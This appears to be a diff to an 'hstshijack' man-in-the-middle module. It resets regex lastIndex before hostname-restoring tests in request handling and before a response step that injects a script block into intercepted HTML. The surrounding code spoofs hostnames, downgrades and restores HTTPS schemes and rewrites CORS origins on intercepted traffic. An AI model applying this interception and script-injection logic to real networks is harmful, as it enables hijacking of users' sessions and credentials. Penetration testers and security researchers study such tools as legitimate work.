@@ -707,6 +707,7 @@ function onRequest(req, res) {
     for (a = 0; a < target_hosts.length; a++) {
       /* Restore original hostnames in headers. */
       regexp_set = toRegexpSet(replacement_hosts[a], target_hosts[a]);
+      regexp_set[0].lastIndex = 0;
       if (regexp_set[0].test(req.Headers)) {
         req.Headers = req.Headers.replace(regexp_set[0], regexp_set[1]);
         log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + replacement_hosts[a] + reset + " in request header(s).");
@@ -714,6 +715,7 @@ function onRequest(req, res) {
 
       if (req.Query !== "") {
         /* Restore original hostnames in query URI. */
+        regexp_set[0].lastIndex = 0;
         if (regexp_set[0].test(req.Query)) {
           req.Query = req.Query.replace(regexp_set[0], regexp_set[1]);
           log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + replacement_hosts[a] + reset + " in query URI.");
@@ -731,6 +733,7 @@ function onRequest(req, res) {
             if (param_value.indexOf("%") !== -1) {
               param_value_decoded = decodeURIComponent(param_value);
               if (param_value !== param_value_decoded) {
+                regexp_set[0].lastIndex = 0;
                 if (regexp_set[0].test(param_value_decoded)) {
                   param_value_decoded_spoofed = param_value_decoded.replace(
                     regexp_set[0],
@@ -744,6 +747,7 @@ function onRequest(req, res) {
                 new_params.push(param);
               }
             } else {
+              regexp_set[0].lastIndex = 0;
               if (regexp_set[0].test(param_value)) {
                 param_value_spoofed = param_value.replace(regexp_set[0], regexp_set[1]);
                 new_params.push(param_name + "=" + param_value_spoofed);
@@ -781,6 +785,7 @@ function onRequest(req, res) {
       /* Restore HTTPS scheme in request headers if domains are indexed. */
       escaped_domain = req.Hostname.replace(selector_all_dots, "\\.").replace(selector_all_dashes, "\\-");
       regexp = new RegExp("http://" + escaped_domain + "([^a-z0-9\\-\\.]|$)", "ig");
+      regexp.lastIndex = 0;
       if (regexp.test(req.Headers)) {
         req.Headers = req.Headers.replace(regexp, "https://" + req.Hostname + "$1");
         log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + req.Hostname + " in request headers.");
@@ -880,6 +885,7 @@ function onResponse(req, res) {
         }
       }
       if (injection !== "") {
+	selector_html_magic.lastIndex = 0;
         if (selector_html_magic.test(res.Body.slice(0, 1000))) {
           res.Body = 
             "<script>\n" +
@@ -982,6 +988,7 @@ function onResponse(req, res) {
     if (allowed_origin !== "*") {
       for (a = 0; a < target_hosts.length; a++) {
         regexp_set = toRegexpSet(target_hosts[a], replacement_hosts[a]);
+        regexp_set[0].lastIndex = 0;
         if (regexp_set[0].test(allowed_origin)) {
           allowed_origin = allowed_origin.replace(regexp_set[0], regexp_set[1]);
           break;
